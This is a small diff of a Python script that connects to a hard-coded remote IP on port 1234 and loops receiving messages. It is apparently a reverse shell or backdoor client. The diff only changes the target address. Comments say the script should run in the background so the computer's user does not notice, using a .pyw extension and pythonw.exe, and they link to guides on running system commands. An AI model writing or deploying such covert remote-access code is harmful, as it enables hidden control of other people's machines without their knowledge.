@@ -5,7 +5,7 @@ from subprocess import call
 
 FORMAT = "utf-8"
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.56.1", 1234))
+s.connect(("10.0.26.244", 1234))
 # this file should be run in the background so the person using the pc is not aware of the process running
 # For this to happen, use the extension.pyw,
 # which will cause the script to be executed by pythonw.exe by default.
@@ -19,7 +19,6 @@ s.connect(("192.168.56.1", 1234))
 #For the cmd part
 # https://www.stackvidhya.com/execute-system-command-or-shell-command-python/
 #https://datatofish.com/command-prompt-python/
-
 
 while (True):
     msg = s.recv(1024)
